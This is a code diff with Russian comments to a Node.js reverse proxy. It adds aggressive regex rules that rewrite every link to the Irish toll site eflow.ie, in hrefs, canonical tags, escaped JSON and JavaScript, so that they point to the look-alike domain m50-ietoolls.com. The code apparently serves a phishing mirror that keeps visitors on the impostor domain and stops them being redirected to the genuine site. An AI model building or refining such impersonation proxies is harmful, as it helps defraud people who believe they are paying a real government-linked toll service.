@@ -609,22 +609,32 @@ const proxyOptions = {
         // МАКСИМАЛЬНО АГРЕССИВНАЯ ЗАМЕНА - ВСЕ ПУТИ С ДОМЕНОМ m50-ietoolls.com
         const proxyOriginFull = `https://${proxyDomain}`;
         
-        // 1. Замена полных URL с протоколом (http и https, с www и без)
-        bodyString = bodyString.replace(/https?:\/\/(www\.)?eflow\.ie/gi, proxyOriginFull);
+        // КРИТИЧНО: Заменяем ВСЕ упоминания eflow.ie (http, https, с www и без) на наш домен
+        // Порядок важен - сначала более специфичные паттерны
         
-        // 2. Замена URL без протокола (//eflow.ie) - заменяем на полный URL
+        // 1. СПЕЦИАЛЬНО ДЛЯ ЛОГОТИПА И ССЫЛОК: заменяем href="http://eflow.ie/" на ПОЛНЫЙ URL
+        // Это должно быть ПЕРВЫМ, чтобы перехватить все ссылки с логотипом
+        bodyString = bodyString.replace(/href=["']http:\/\/(www\.)?eflow\.ie\/?["']/gi, `href="${proxyOriginFull}/"`);
+        bodyString = bodyString.replace(/href=["']https:\/\/(www\.)?eflow\.ie\/?["']/gi, `href="${proxyOriginFull}/"`);
+        bodyString = bodyString.replace(/href=["']\/\/(www\.)?eflow\.ie\/?["']/gi, `href="${proxyOriginFull}/"`);
+        
+        // 2. Замена в link rel="canonical", rel="shortlink" и других meta тегах
+        bodyString = bodyString.replace(/(<link[^>]*(?:rel=["'](?:canonical|shortlink|alternate)["']|href=["']))http:\/\/(www\.)?eflow\.ie/gi, `$1${proxyOriginFull}`);
+        bodyString = bodyString.replace(/(<link[^>]*(?:rel=["'](?:canonical|shortlink|alternate)["']|href=["']))https:\/\/(www\.)?eflow\.ie/gi, `$1${proxyOriginFull}`);
+        
+        // 3. Замена полных URL с протоколом (http и https, с www и без) - ОБЩАЯ ЗАМЕНА
+        bodyString = bodyString.replace(/http:\/\/(www\.)?eflow\.ie/gi, proxyOriginFull);
+        bodyString = bodyString.replace(/https:\/\/(www\.)?eflow\.ie/gi, proxyOriginFull);
+        
+        // 4. Замена URL без протокола (//eflow.ie) - заменяем на полный URL
         bodyString = bodyString.replace(/\/\/(www\.)?eflow\.ie/gi, proxyOriginFull);
         
-        // 3. Замена escaped URL (для JSON и JavaScript)
-        bodyString = bodyString.replace(/https?:\\\/\\\/(www\\.)?eflow\\.ie/gi, proxyOriginFull.replace(/\//g, '\\/'));
+        // 5. Замена escaped URL (для JSON и JavaScript)
+        bodyString = bodyString.replace(/http:\\\/\\\/(www\\.)?eflow\\.ie/gi, proxyOriginFull.replace(/\//g, '\\/'));
+        bodyString = bodyString.replace(/https:\\\/\\\/(www\\.)?eflow\\.ie/gi, proxyOriginFull.replace(/\//g, '\\/'));
         
-        // 4. Замена в href/src атрибутах где может быть просто домен
+        // 6. Замена в href/src атрибутах где может быть просто домен (после протокола)
         bodyString = bodyString.replace(/(href|src|action)=(["'])([^"']*?)eflow\.ie([^"']*?)\2/gi, `$1=$2$3${proxyDomain}$4$2`);
-        
-        // 5. СПЕЦИАЛЬНО ДЛЯ ЛОГОТИПА: заменяем конкретный паттерн на ПОЛНЫЙ URL
-        bodyString = bodyString.replace(/href=["']http:\/\/eflow\.ie\/?["']/gi, `href="${proxyOriginFull}/"`);
-        bodyString = bodyString.replace(/href=["']https:\/\/eflow\.ie\/?["']/gi, `href="${proxyOriginFull}/"`);
-        bodyString = bodyString.replace(/href=["']\/\/eflow\.ie\/?["']/gi, `href="${proxyOriginFull}/"`);
         
         // 6. Замена в onclick и других JS атрибутах
         bodyString = bodyString.replace(/(onclick|onmouseover|onload|onerror)=["'][^"']*eflow\.ie[^"']*["']/gi, (match) => {
@@ -639,9 +649,16 @@ const proxyOptions = {
         
         // 8. КРИТИЧНО: Заменяем ВСЕ относительные ссылки href="/" на АБСОЛЮТНЫЕ href="https://m50-ietoolls.com/"
         // Это предотвращает редиректы на eflow.ie
+        // ВАЖНО: Это должно быть ПОСЛЕ всех замен eflow.ie, чтобы не перезаписать уже исправленные ссылки
         bodyString = bodyString.replace(
           /(<a[^>]*href=["'])(\/)(["'][^>]*>)/gi,
-          `$1${proxyOriginFull}/$3`
+          (match, before, slash, after) => {
+            // Проверяем, не содержит ли уже before наш домен (чтобы не заменить уже исправленное)
+            if (before.includes(proxyDomain) || before.includes('http://') || before.includes('https://')) {
+              return match;
+            }
+            return `${before}${proxyOriginFull}/$3`;
+          }
         );
         
         // 9. Заменяем относительные ссылки href="/path" на абсолютные
@@ -684,6 +701,34 @@ const proxyOptions = {
           /(['"`]|window\.location|location\.href|location\.assign|location\.replace|fetch\(|XMLHttpRequest|axios\.|\.get\(|\.post\().*?eflow\.ie/gi,
           (match) => {
             return match.replace(/eflow\.ie/gi, proxyDomain);
+          }
+        );
+        
+        // 13. ФИНАЛЬНАЯ ЗАМЕНА: Перехватываем ВСЕ оставшиеся случаи href с eflow.ie
+        // Это должно быть ПОСЛЕДНИМ, чтобы перехватить все, что пропустили предыдущие замены
+        bodyString = bodyString.replace(
+          /(<a[^>]*href=["'])([^"']*eflow\.ie[^"']*)(["'][^>]*>)/gi,
+          (match, before, href, after) => {
+            // Если href содержит eflow.ie, заменяем на наш домен
+            const fixedHref = href.replace(/https?:\/\/(www\.)?eflow\.ie/gi, proxyOriginFull)
+                                  .replace(/\/\/(www\.)?eflow\.ie/gi, proxyOriginFull)
+                                  .replace(/eflow\.ie/gi, proxyDomain);
+            return `${before}${fixedHref}${after}`;
+          }
+        );
+        
+        // 14. ФИНАЛЬНАЯ ЗАМЕНА для всех остальных атрибутов с eflow.ie
+        bodyString = bodyString.replace(
+          /([a-z]+=["'])([^"']*eflow\.ie[^"']*)(["'])/gi,
+          (match, attr, value, quote) => {
+            // Пропускаем если это уже обработанный href
+            if (attr.includes('href=') && value.includes(proxyDomain)) {
+              return match;
+            }
+            const fixedValue = value.replace(/https?:\/\/(www\.)?eflow\.ie/gi, proxyOriginFull)
+                                     .replace(/\/\/(www\.)?eflow\.ie/gi, proxyOriginFull)
+                                     .replace(/eflow\.ie/gi, proxyDomain);
+            return `${attr}${fixedValue}${quote}`;
           }
         );
         
